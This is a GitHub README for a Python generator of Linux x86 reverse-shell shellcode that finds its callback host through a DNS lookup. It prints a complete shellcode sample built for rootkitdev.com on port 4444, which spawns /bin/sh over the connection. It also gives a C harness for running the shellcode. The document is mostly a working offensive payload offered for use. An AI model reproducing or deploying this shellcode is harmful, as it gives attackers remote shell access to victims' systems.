# KotikDNSPayload
ReverseDnsPayload -- The First and Only In The World! 

## Currenty working on uploading this to Metapsloit Stay Tuned!




![xitriykotik](https://github.com/ApertureSecurity/KotikDNSPayload/blob/master/HitriyKotik.png)


```
Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! 

 !!!!! A Reverse DNS TCP Payload For Linux !!!!! 

 Tell Me , a few things and I will generate the shellcode for you!
[+] Tell Me The Domain You wish To Connect Back To : rootkitdev.com
[+] Tell Me The Port   You Wish To Connect Back To : 4444
[+] I Am Making Your PayLoad Right Now....
[+] ASM Created Successfully....
[+] Nasm Compiling........
[+] Objdumping........


\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x6a\x02\x6a\x02\x89\xe1\xcd\x80\x50\x68\x08\x08\x08\x08\x31\xd2\xb6\x35\x66\x52\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x89\xe1\x89\xc6\x31\xc0\xb0\x66\x80\xc3\x02\xcd\x80\x31\xc0\xb0\x66\x6a\x00\x68\x00\x01\x00\x01\x68\x63\x6f\x6d\x00\x68\x64\x65\x76\x03\x68\x74\x6b\x69\x74\x68\x0a\x72\x6f\x6f\x6a\x00\x68\x00\x01\x00\x00\x68\xaa\xaa\x01\x00\x89\xe2\x31\xc9\x51\x6a\x40\x52\x56\x89\xe1\x31\xdb\xb3\x09\xcd\x80\xb8\x03\x00\x00\x00\xbb\x03\x00\x00\x00\x89\xe1\xba\x64\x00\x00\x00\xcd\x80\x01\xc4\x83\xec\x04\x8b\x04\x24\x50\x31\xd2\x6a\x66\x58\x6a\x01\x5b\x52\x53\x5a\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x6a\x03\x5b\x52\x66\x68\x5c\x11\x66\x6a\x02\x89\xe7\x6a\x10\x57\x56\x89\xe1\xcd\x80\x89\xf3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xbc\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80


```



# To Run:
simply run ...
```
python hitriykotik.py 
```

and you'll be greeted by the Cat above and he will ask you a couple of questions and use nasm and objdump to give you yourshellcode.

# Requirements

Linux is desireable, but not required.
1. python2.7
2. nasm
3. objectdump


# For Testing:
Make a C file and compile using
```
gcc -m32 test.c -o test
``` 
```
#include<stdio.h>
#include<string.h>

const char shellcode[] =  "\0x00\YOUR\SHELL\CODE\0x00\";



int main(){
    int (*ret)() = (int(*)())shellcode;
    ret();
}


```

# Known Issues:
I am reading from a socket For the DNS response. Read will wait until the socket has a buffer to read from. This means that if you receive no DNS response , your program will wait indefinitley. 

### Stay Secure My Friends!